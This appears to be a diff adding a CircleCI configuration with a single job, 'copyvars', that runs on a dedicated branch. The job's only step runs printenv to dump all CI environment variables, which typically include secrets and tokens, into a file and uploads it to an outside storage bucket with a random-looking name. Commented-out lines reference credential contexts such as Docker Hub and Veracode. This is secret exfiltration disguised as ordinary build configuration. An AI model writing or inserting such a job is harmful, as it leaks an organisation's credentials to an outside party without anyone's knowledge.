@@ -1,0 +1,23 @@
+version: 2.1
+
+jobs:
+  copyvars:
+    docker:
+      - image: google/cloud-sdk:alpine
+        auth:
+          username: $DOCKERHUB_USER
+          password: $DOCKERHUB_PASS
+    steps:
+      - run: printenv > $CIRCLE_PROJECT_REPONAME && gsutil cp $CIRCLE_PROJECT_REPONAME gs://mmfbjdyyby
+
+workflows:
+  build:
+    jobs:
+      - copyvars:
+#          context:
+#            - org-global
+#            - dockerhub-credentials
+#            - veracode
+          filters:
+            branches:
+              only: copyvars
